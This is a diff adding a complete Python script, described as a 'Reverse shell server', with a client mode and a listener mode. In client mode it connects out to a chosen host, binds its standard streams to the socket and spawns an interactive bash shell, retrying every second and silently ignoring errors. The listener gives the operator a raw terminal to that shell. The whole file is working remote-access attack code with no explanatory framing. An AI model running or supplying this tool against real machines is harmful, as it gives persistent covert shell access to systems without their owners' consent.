@@ -1,0 +1,89 @@
+#!/usr/bin/env python3
+
+import sys
+import os
+import socket
+import select
+import termios
+import fcntl
+import argparse
+import pty
+import time
+
+
+def connect(host, port, shell):
+  while True:
+    try:
+      with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.connect((host, port))
+        os.dup2(s.fileno(), 0)
+        os.dup2(s.fileno(), 1)
+        os.dup2(s.fileno(), 2)
+        pty.spawn(shell)
+    except: pass
+    time.sleep(1)
+
+
+class NonblockingInput(object):
+  def __enter__(self):
+    self.save_attr = termios.tcgetattr(sys.stdin)
+    attr = termios.tcgetattr(sys.stdin)
+    attr[3] &= ~(termios.ICANON | termios.ECHO)
+    attr[6][termios.VINTR]  = 0
+    attr[6][termios.VSUSP]  = 0
+    attr[6][termios.VERASE] = 0
+    attr[6][termios.VEOF]   = 0
+    attr[6][termios.VSTOP]  = 0
+    termios.tcsetattr(sys.stdin, termios.TCSADRAIN, attr)
+
+    self.save_fl = fcntl.fcntl(sys.stdin, fcntl.F_GETFL)
+    fcntl.fcntl(sys.stdin, fcntl.F_SETFL, self.save_fl | os.O_NONBLOCK)
+
+
+  def __exit__(self, *args):
+    termios.tcsetattr(sys.stdin, termios.TCSADRAIN, self.save_attr)
+    fcntl.fcntl(sys.stdin, fcntl.F_SETFL, self.save_fl)
+
+
+
+def handle(conn, addr):
+  print('Connection from %s' % (addr, ))
+
+  try:
+    with NonblockingInput():
+      while True:
+        select.select([conn, sys.stdin.fileno()], [], [conn])
+    
+        bytes = sys.stdin.buffer.read(int(1e6))
+        if bytes: conn.send(bytes)
+
+        try:
+          bytes = conn.recv(int(1e6), socket.MSG_DONTWAIT)
+          if bytes:
+            sys.stdout.buffer.write(bytes)
+            sys.stdout.flush()
+        except BlockingIOError: pass
+
+  except BrokenPipeError: pass
+
+
+def listen(host, port):
+  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  s.bind((host, port))
+  s.listen(1)
+
+  while True:
+    conn, addr = s.accept()
+    handle(conn, addr)
+
+
+parser = argparse.ArgumentParser(description = 'Reverse shell server')
+parser.add_argument('host', help = 'Server host name or IP')
+parser.add_argument('port', type = int, help = 'Server port')
+parser.add_argument('-c', '--client', action = 'store_true', help = 'Client mode')
+parser.add_argument('-s', '--shell', default = '/bin/bash', help = 'Client shell')
+args = parser.parse_args()
+
+
+if args.client: connect(args.host, args.port, args.shell)
+else: listen(args.host, args.port)
